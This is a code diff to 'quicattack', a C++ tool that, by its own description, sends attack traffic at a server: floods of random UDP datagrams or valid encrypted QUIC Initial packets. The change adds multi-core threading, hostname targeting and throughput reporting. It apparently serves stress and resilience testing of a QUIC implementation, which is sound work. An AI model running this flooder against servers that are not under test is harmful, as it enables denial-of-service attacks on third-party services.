@@ -22,12 +22,26 @@
 
 #define ATTACK_TIMEOUT_DEFAULT_MS (60 * 1000)
 
-#define ATTACK_THREADS_DEFAULT 1
+#define ATTACK_THREADS_DEFAULT QuicProcActiveCount()
 
 #define ATTACK_PORT_DEFAULT 443
 
-void
-PrintUsage()
+static QUIC_DATAPATH* Datapath;
+static QUIC_DATAPATH_BINDING* Binding;
+
+static uint32_t AttackType;
+static const char* ServerName;
+static const char* IpAddress;
+static QUIC_ADDR ServerAddress;
+static const char* Alpn = "h3-29";
+static uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
+static uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;
+
+static uint64_t TimeStart;
+static int64_t TotalPacketCount;
+static int64_t TotalByteCount;
+
+void PrintUsage()
 {
     printf("quicattack is used for generating attack traffic towards a designated server.\n\n");
 
@@ -36,8 +50,7 @@ PrintUsage()
     printf("  quicattack.exe -type:<number> -ip:<ip_address_and_port> [-alpn:<protocol_name>] [-sni:<host_name>] [-timeout:<ms>] [-threads:<count>]\n\n");
 }
 
-void
-PrintUsageList()
+void PrintUsageList()
 {
     printf("The following are the different types of attacks supported by the tool.\n\n");
 
@@ -90,20 +103,11 @@ UdpUnreachCallback(
 {
 }
 
-void
-RunAttackRandom(
-    QUIC_DATAPATH_BINDING* Binding,
-    const QUIC_ADDR* ServerAddress,
-    uint16_t Length,
-    bool ValidQuic,
-    uint64_t TimeoutMs
-    )
+void RunAttackRandom(uint16_t Length, bool ValidQuic)
 {
     uint64_t ConnectionId = 0;
     QuicRandom(sizeof(ConnectionId), &ConnectionId);
 
-    uint64_t PacketCount = 0;
-    uint64_t TimeStart = QuicTimeMs64();
     while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {
 
         QUIC_DATAPATH_SEND_CONTEXT* SendContext =
@@ -143,24 +147,20 @@ RunAttackRandom(
                     Header->DestCid + 18);
             }
 
-            ++PacketCount;
+            InterlockedExchangeAdd64(&TotalPacketCount, 1);
+            InterlockedExchangeAdd64(&TotalByteCount, Length);
         }
 
         QUIC_STATUS Status =
             QuicDataPathBindingSendTo(
                 Binding,
-                ServerAddress,
+                &ServerAddress,
                 SendContext);
         if (QUIC_FAILED(Status)) {
             printf("QuicDataPathBindingSendTo failed, 0x%x\n", Status);
             return;
         }
     }
-
-    uint64_t TimeEnd = QuicTimeMs64();
-    printf("%llu packets were sent (%llu Hz).\n",
-        (unsigned long long)PacketCount,
-        (unsigned long long)(PacketCount * 1000) / QuicTimeDiff64(TimeStart, TimeEnd));
 }
 
 #if DEBUG
@@ -176,20 +176,13 @@ void printf_buf(const char* name, void* buf, uint32_t len)
 #define printf_buf(name, buf, len)
 #endif
 
-void
-RunAttackValidInitial(
-    QUIC_DATAPATH_BINDING* Binding,
-    const QUIC_ADDR* ServerAddress,
-    _In_z_ const char* Alpn,
-    _In_opt_z_ const char* ServerName,
-    uint64_t TimeoutMs
-    )
+void RunAttackValidInitial()
 {
-    const StrBuffer InitialSalt("7fbcdb0e7c66bbe9193a96cd21519ebd7a02644a");
-    const uint16_t DatagramLength = 1200;
+    const StrBuffer InitialSalt("afbfec289993d24c9e9786f19c6111e04390a899");
+    const uint16_t DatagramLength = QUIC_MIN_INITIAL_LENGTH;
     const uint64_t PacketNumber = 0;
 
-    uint8_t Packet[256] = {0};
+    uint8_t Packet[512] = {0};
     uint16_t PacketLength, HeaderLength;
     PacketWriter::WriteClientInitialPacket(
         PacketNumber,
@@ -205,11 +198,20 @@ RunAttackValidInitial(
     uint64_t* DestCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1));
     uint64_t* SrcCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1) + sizeof(uint64_t) + sizeof(uint8_t));
 
+    uint64_t* OrigSrcCid = nullptr;
+    for (uint16_t i = HeaderLength; i < PacketLength; ++i) {
+        if (MagicCid == *(uint64_t*)&Packet[i]) {
+            OrigSrcCid = (uint64_t*)&Packet[i];
+        }
+    }
+    if (!OrigSrcCid) {
+        printf("Failed to find OrigSrcCid!\n");
+        return;
+    }
+
     QuicRandom(sizeof(uint64_t), DestCid);
     QuicRandom(sizeof(uint64_t), SrcCid);
 
-    uint64_t PacketCount = 0;
-    uint64_t TimeStart = QuicTimeMs64();
     while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {
 
         QUIC_DATAPATH_SEND_CONTEXT* SendContext =
@@ -224,6 +226,7 @@ RunAttackValidInitial(
             VERIFY(SendBuffer);
 
             (*DestCid)++; (*SrcCid)++;
+            *OrigSrcCid = *SrcCid;
             memcpy(SendBuffer->Buffer, Packet, PacketLength);
 
             printf_buf("cleartext", SendBuffer->Buffer, PacketLength - QUIC_ENCRYPTION_OVERHEAD);
@@ -275,47 +278,34 @@ RunAttackValidInitial(
 
             printf_buf("protected", SendBuffer->Buffer, PacketLength);
 
-            ++PacketCount;
+            InterlockedExchangeAdd64(&TotalPacketCount, 1);
+            InterlockedExchangeAdd64(&TotalByteCount, DatagramLength);
         }
 
         VERIFY(
         QUIC_SUCCEEDED(
         QuicDataPathBindingSendTo(
             Binding,
-            ServerAddress,
+            &ServerAddress,
             SendContext)));
     }
-
-    uint64_t TimeEnd = QuicTimeMs64();
-    printf("%llu packets were sent (%llu Hz).\n",
-        (unsigned long long)PacketCount,
-        (unsigned long long)(PacketCount * 1000) / QuicTimeDiff64(TimeStart, TimeEnd));
 }
 
-struct ATTACK_THREAD_CONTEXT {
-    QUIC_DATAPATH_BINDING* Binding;
-    uint32_t Type;
-    const QUIC_ADDR* ServerAddress;
-    const char* Alpn;
-    const char* ServerName;
-    uint64_t TimeoutMs;
-};
-
-QUIC_THREAD_CALLBACK(RunAttackThread, _Context)
+QUIC_THREAD_CALLBACK(RunAttackThread, Context)
 {
-    const ATTACK_THREAD_CONTEXT* Context = (ATTACK_THREAD_CONTEXT*)_Context;
-    switch (Context->Type) {
+    UNREFERENCED_PARAMETER(Context);
+    switch (AttackType) {
     case 1:
-        RunAttackRandom(Context->Binding, Context->ServerAddress, 1, false, Context->TimeoutMs);
+        RunAttackRandom(1, false);
         break;
     case 2:
-        RunAttackRandom(Context->Binding, Context->ServerAddress, QUIC_MIN_INITIAL_LENGTH, false, Context->TimeoutMs);
+        RunAttackRandom(QUIC_MIN_INITIAL_LENGTH, false);
         break;
     case 3:
-        RunAttackRandom(Context->Binding, Context->ServerAddress, QUIC_MIN_INITIAL_LENGTH, true, Context->TimeoutMs);
+        RunAttackRandom(QUIC_MIN_INITIAL_LENGTH, true);
         break;
     case 4:
-        RunAttackValidInitial(Context->Binding, Context->ServerAddress, Context->Alpn, Context->ServerName, Context->TimeoutMs);
+        RunAttackValidInitial();
         break;
     default:
         break;
@@ -323,70 +313,48 @@ QUIC_THREAD_CALLBACK(RunAttackThread, _Context)
     QUIC_THREAD_RETURN(QUIC_STATUS_SUCCESS);
 }
 
-void
-RunAttack(
-    uint32_t ThreadCount,
-    uint32_t Type,
-    const QUIC_ADDR* ServerAddress,
-    _In_z_ const char* Alpn,
-    _In_opt_z_ const char* ServerName,
-    uint64_t TimeoutMs
-    )
+void RunAttack()
 {
-    QUIC_STATUS Status;
-    QUIC_DATAPATH* Datapath = nullptr;
-    QUIC_DATAPATH_BINDING* Binding = nullptr;
-
-    Status =
-        QuicDataPathInitialize(
-            0,
-            UdpRecvCallback,
-            UdpUnreachCallback,
-            &Datapath);
-    if (QUIC_FAILED(Status)) {
-        printf("QuicDataPathInitialize failed, 0x%x\n", Status);
-        goto Error;
-    }
-
-    Status =
+    QUIC_STATUS Status =
         QuicDataPathBindingCreate(
             Datapath,
             nullptr,
-            ServerAddress,
+            &ServerAddress,
             nullptr,
             &Binding);
     if (QUIC_FAILED(Status)) {
         printf("QuicDataPathBindingCreate failed, 0x%x\n", Status);
-        goto Error;
+        return;
     }
 
-    {
-        ATTACK_THREAD_CONTEXT ThreadContext = {
-            Binding, Type, ServerAddress, Alpn, ServerName, TimeoutMs
+    QUIC_THREAD* Threads =
+        (QUIC_THREAD*)QUIC_ALLOC_PAGED(ThreadCount * sizeof(QUIC_THREAD));
+
+    uint32_t ProcCount = QuicProcActiveCount();
+    TimeStart = QuicTimeMs64();
+
+    for (uint32_t i = 0; i < ThreadCount; ++i) {
+        QUIC_THREAD_CONFIG ThreadConfig = {
+            QUIC_THREAD_FLAG_SET_IDEAL_PROC | QUIC_THREAD_FLAG_SET_AFFINITIZE,
+            (uint8_t)(i % ProcCount),
+            "AttackRunner",
+            RunAttackThread,
+            nullptr
         };
-        QUIC_THREAD* Threads =
-            (QUIC_THREAD*)QUIC_ALLOC_PAGED(ThreadCount * sizeof(QUIC_THREAD));
-        for (uint32_t i = 0; i < ThreadCount; ++i) {
-            QUIC_THREAD_CONFIG ThreadConfig = {
-                0, 0, "AttackRunner", RunAttackThread, &ThreadContext
-            };
-            QuicThreadCreate(&ThreadConfig, &Threads[i]);
-        }
-        for (uint32_t i = 0; i < ThreadCount; ++i) {
-            QuicThreadWait(&Threads[i]);
-            QuicThreadDelete(&Threads[i]);
-        }
+        QuicThreadCreate(&ThreadConfig, &Threads[i]);
     }
 
-Error:
-
-    if (Binding != nullptr) {
-        QuicDataPathBindingDelete(Binding);
+    for (uint32_t i = 0; i < ThreadCount; ++i) {
+        QuicThreadWait(&Threads[i]);
+        QuicThreadDelete(&Threads[i]);
     }
 
-    if (Datapath != nullptr) {
-        QuicDataPathUninitialize(Datapath);
-    }
+    uint64_t TimeEnd = QuicTimeMs64();
+    printf("Packet Rate: %llu KHz\n", (unsigned long long)(TotalPacketCount) / QuicTimeDiff64(TimeStart, TimeEnd));
+    printf("Bit Rate: %llu mbps\n", (unsigned long long)(8 * TotalByteCount) / (1000 * QuicTimeDiff64(TimeStart, TimeEnd)));
+    QUIC_FREE(Threads);
+
+    QuicDataPathBindingDelete(Binding);
 }
 
 int
@@ -400,6 +368,11 @@ main(
 
     QuicPlatformSystemLoad();
     QuicPlatformInitialize();
+    QuicDataPathInitialize(
+        0,
+        UdpRecvCallback,
+        UdpUnreachCallback,
+        &Datapath);
 
     if (argc < 2) {
         PrintUsage();
@@ -411,48 +384,55 @@ main(
         ErrorCode = 0;
 
     } else {
-        uint32_t Type;
-        const char* IpAddress;
-        if (!TryGetValue(argc, argv, "type", &Type) ||
-            !TryGetValue(argc, argv, "ip", &IpAddress)) {
+        if (!TryGetValue(argc, argv, "type", &AttackType)) {
             PrintUsage();
             goto Error;
         }
 
-        if (Type < 1 || Type > 4) {
-            printf("Invalid -type:'%d' specified!\n", Type);
+        if (AttackType < 1 || AttackType > 4) {
+            printf("Invalid -type:'%u' specified!\n", AttackType);
             goto Error;
         }
 
-        const char* Alpn = "h3-25";
-        (void)TryGetValue(argc, argv, "alpn", &Alpn);
+        TryGetValue(argc, argv, "ip", &IpAddress);
+        TryGetValue(argc, argv, "alpn", &Alpn);
+        TryGetValue(argc, argv, "sni", &ServerName);
+        TryGetValue(argc, argv, "timeout", &TimeoutMs);
+        TryGetValue(argc, argv, "threads", &ThreadCount);
 
-        const char* ServerName = nullptr;
-        (void)TryGetValue(argc, argv, "sni", &ServerName);
-
-        uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
-        (void)TryGetValue(argc, argv, "timeout", &TimeoutMs);
-
-        uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;
-        (void)TryGetValue(argc, argv, "threads", &ThreadCount);
-
-        QUIC_ADDR TargetAddress = {0};
-        if (!ConvertArgToAddress(IpAddress, ATTACK_PORT_DEFAULT, &TargetAddress)) {
-            printf("Invalid -ip:'%s' specified! Must be IPv4 or IPv6 address and port.\n", IpAddress);
-            goto Error;
+        if (IpAddress == nullptr) {
+            if (ServerName == nullptr) {
+                printf("'ip' or 'sni' must be specified!\n");
+                goto Error;
+            }
+            if (QUIC_FAILED(
+                QuicDataPathResolveAddress(
+                    Datapath,
+                    ServerName,
+                    &ServerAddress))) {
+                printf("Failed to resolve IP address of '%s'.\n", ServerName);
+                goto Error;
+            }
+            QuicAddrSetPort(&ServerAddress, ATTACK_PORT_DEFAULT);
+        } else {
+            if (!QuicAddrFromString(IpAddress, ATTACK_PORT_DEFAULT, &ServerAddress)) {
+                printf("Invalid -ip:'%s' specified!\n", IpAddress);
+                goto Error;
+            }
         }
 
-        if (TargetAddress.Ipv4.sin_port == 0) {
+        if (ServerAddress.Ipv4.sin_port == 0) {
             printf("A UDP port must be specified with the IP address.\n");
             goto Error;
         }
 
-        RunAttack(ThreadCount, Type, &TargetAddress, Alpn, ServerName, TimeoutMs);
+        RunAttack();
         ErrorCode = 0;
     }
 
 Error:
 
+    QuicDataPathUninitialize(Datapath);
     QuicPlatformUninitialize();
     QuicPlatformSystemUnload();
 
